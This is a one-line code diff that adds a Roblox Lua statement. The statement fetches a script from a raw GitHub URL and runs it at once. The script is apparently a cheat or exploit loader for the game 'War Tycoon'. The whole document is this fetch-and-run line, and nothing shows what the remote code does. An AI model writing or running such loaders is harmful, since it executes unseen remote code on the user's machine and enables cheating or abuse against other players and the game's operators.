@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/vortexorbimagine/loaders/main/loaders/kf-41-war-tycoon-spam3-vd2yp78rkz1ki8.lua"))()
